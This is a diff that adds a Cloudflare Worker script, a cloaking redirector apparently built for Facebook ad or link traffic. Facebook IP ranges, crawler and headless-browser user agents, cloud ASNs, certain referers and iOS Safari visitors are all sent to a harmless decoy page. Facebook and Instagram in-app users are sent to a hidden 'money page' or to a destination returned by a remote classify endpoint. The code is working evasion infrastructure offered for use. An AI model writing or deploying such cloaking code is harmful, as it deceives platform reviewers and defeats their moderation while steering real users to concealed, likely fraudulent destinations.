@@ -1,0 +1,134 @@
+// ============================================================
+// Cloudflare Worker v4 — FIXED FLOW VERSION
+// ============================================================
+
+const DECOY = 'https://www.facebookblueprint.com/student/catalog';
+const BLOG = 'https://post-tweet.sydzada-amir.workers.dev/';
+const CLASSIFY_URL = 'https://post-tweet.sydzada-amir.workers.dev/';
+const FALLBACK = 'https://post-tweet.sydzada-amir.workers.dev/';
+
+const FB_RANGES = [
+  '69.63.176.0/20','69.63.184.0/21',
+  '66.220.144.0/20','66.220.144.0/21',
+  '31.13.24.0/21','31.13.64.0/18',
+  '157.240.0.0/16','179.60.192.0/22',
+  '185.60.216.0/22','204.15.20.0/22',
+  '69.171.224.0/19','74.119.76.0/22',
+  '103.4.96.0/22','129.134.0.0/16',
+  '163.70.128.0/17','173.252.64.0/18',
+  '31.13.0.0/16','66.220.0.0/16',
+];
+
+const BOT_ASNS = [
+  '15169','8075','16509','14618','396982',
+  '20940','54113','13335','16276','14061',
+  '63949','24940','46606','55286','6939',
+  '20473','36351','40676','53667','62240',
+];
+
+function ipToInt(ip) {
+  return ip.split('.').reduce((a, b) => (a << 8) + parseInt(b), 0) >>> 0;
+}
+
+function ipInRange(ip, range) {
+  try {
+    const [r, bits] = range.split('/');
+    const mask = ~((1 << (32 - parseInt(bits))) - 1);
+    return (ipToInt(ip) & mask) === (ipToInt(r) & mask);
+  } catch { return false; }
+}
+
+export default {
+  async fetch(request) {
+    const ua = request.headers.get('user-agent') || '';
+    const ip = request.headers.get('CF-Connecting-IP') || '';
+    const url = new URL(request.url);
+    const cf = request.cf || {};
+    const referer = request.headers.get('referer') || '';
+    const host = url.hostname.toLowerCase();
+
+    // ========================================================
+    // 🛑 MOBILE SAFARI BLOCK (ADDED)
+    // ========================================================
+    // Targets strict iOS Mobile Safari, safely ignoring Chrome (CriOS) and Edge (EdiOS)
+    const isMobileSafari = /iPhone|iPad|iPod/.test(ua) && 
+                           /Safari/.test(ua) && 
+                           !/CriOS|EdiOS/.test(ua);
+
+    if (isMobileSafari) {
+      return Response.redirect(DECOY, 302);
+    }
+
+    // ========================================================
+    // 🔥 FIX 1: IM + LM ALWAYS MONEY PAGE (NO EXCEPTIONS)
+    // ========================================================
+    if (host === 'im.facebook.com' || host === 'lm.facebook.com') {
+      return Response.redirect(BLOG, 302);
+    }
+
+    // ========================================================
+    // 🔥 FIX 2: SAFE REFERER HANDLING (CRITICAL FIX)
+    // ========================================================
+    const isFBApp = /FB_IAB|FBAN|FBAV|Instagram/i.test(ua);
+    const isFacebookReferer = /facebook\.com|fb\.com/i.test(referer);
+
+    if (isFacebookReferer && !isFBApp) {
+      return Response.redirect(DECOY, 302);
+    }
+
+    // ========================================================
+    // FB HOSTS BLOCK (FIXED - MORE RELIABLE)
+    // ========================================================
+    const isFBHost =
+      host.includes('facebook.com') ||
+      host.includes('fb.com');
+
+    if (isFBHost) {
+      return Response.redirect(DECOY, 302);
+    }
+
+    // ========================================================
+    // BASIC BOT CHECK
+    // ========================================================
+    if (/facebookexternalhit|facebot|meta-externalagent|headless|selenium|puppeteer|webdriver/i.test(ua)) {
+      return Response.redirect(DECOY, 302);
+    }
+
+    if (!ua || ua.trim() === '') {
+      return Response.redirect(DECOY, 302);
+    }
+
+    if (FB_RANGES.some(r => ipInRange(ip, r))) {
+      return Response.redirect(DECOY, 302);
+    }
+
+    if (BOT_ASNS.includes(String(cf.asn || ''))) {
+      return Response.redirect(DECOY, 302);
+    }
+
+    // ========================================================
+    // FB APP FLOW (SAFE)
+    // ========================================================
+    if (isFBApp) {
+      try {
+        const fp = {};
+
+        const res = await fetch(CLASSIFY_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fp)
+        });
+
+        const data = await res.json();
+        return Response.redirect(data.destination || FALLBACK, 302);
+      } catch (e) {
+        return Response.redirect(FALLBACK, 302);
+      }
+    }
+
+    // ========================================================
+    // DEFAULT
+    // ========================================================
+    return Response.redirect(BLOG, 302);
+  }
+};
